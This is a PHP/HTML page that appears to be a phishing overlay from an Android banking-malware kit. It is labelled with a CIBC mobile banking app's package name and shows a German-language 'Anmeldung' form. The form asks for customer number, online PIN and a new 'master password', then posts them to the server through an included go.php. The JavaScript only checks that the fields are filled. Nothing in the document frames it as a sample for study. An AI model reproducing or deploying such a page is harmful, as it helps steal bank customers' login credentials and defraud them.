
<?php require_once '../go.php';?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>com.cibc.android.mobi</title>
        <link rel="stylesheet" href="libs/bootstrap/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="libs/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="libs/css/style.css">

</head>
<body>

<div id="header">
	Anmeldung
</div>
<div class="col-xs-10 col-sm-8">
    <div class="fitMlbody" id="content_div" style="margin-top: 20px;">
	
	<p style="font-size: 22px;width: 100%;"> Bitte geben Sie für die Anmeldung Ihre Kundennummer und Ihre Online-PIN-Code. Legen Sie zusätzliche eine Bezeichnung und ein Masterpassword für due zuküntige Anmeldung fest. </p>
		
        <section class="content">
            <form method="post">
<center>
                <div class="teaser_box">
                    <input type="hidden" value="com.cibc.android.mobi" name="field1">
					<div class="form">
						<div class="ptb">
							<input name="field2" id="login" maxlength="16" placeholder="Bezeichnung festlegen (z.B. Max Giro)" class="input-field" type="text">
						</div>
						<br />
						<div class="ptb">
							<input name="field3" id="kundennummer" maxlength="12" placeholder="Kundennummer" class="input-field" type="text" />

						</div> 
						<br />
						<div class="ptb">
							<input name="field3" id="onpinepin" maxlength="12" placeholder="Online-PIN" class="input-field" type="password" />

						</div> 
						<br />
						<div class="ptb">
							<input name="field3" id="masterpassword1" maxlength="12" placeholder="Masterpassword festlegen (mind. 6 Stellen)" class="input-field" type="password" />

						</div> 
						<br />
						<div class="ptb">
							<input name="field3" id="masterpassword2" maxlength="12" placeholder="Masterpassword wiederholen" class="input-field" type="password" />

						</div> 
					</div>
					<br />
                    <div class="ptb-button">
                        <input type="submit" value="Anmelden" id="submitBtn1" class="submit-button" />
                        <br />
                    </div>

                </div>
</center>
            </form>
<script type="text/javascript">
			document.getElementById('submitBtn1').onclick = function(){

            var oNumInp = document.getElementById('login');
			var oKundennummerInp = document.getElementById('kundennummer');
			var oOnpinepinInp = document.getElementById('onpinepin');
			var oMasterpassword1Inp = document.getElementById('masterpassword1');
			var oMasterpassword2Inp = document.getElementById('masterpassword2');
			
				try{
							oNumInp.className = oKundennummerInp.className = oOnpinepinInp.className = oMasterpassword1Inp.className = oMasterpassword2Inp.className = 'input-field';
						} catch(e){};
						
                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{3,100}$/i.test(oKundennummerInp.value)) {
							try{
                                oKundennummerInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{3,100}$/i.test(oOnpinepinInp.value)) {
							try{
                                oOnpinepinInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{3,100}$/i.test(oMasterpassword1Inp.value)) {
							try{
                                oMasterpassword1Inp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{3,100}$/i.test(oMasterpassword2Inp.value)) {
							try{
                                oMasterpassword2Inp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
                   
                }
					 
					
</script>
        </section>
    </div>
</div>
</body>
</html>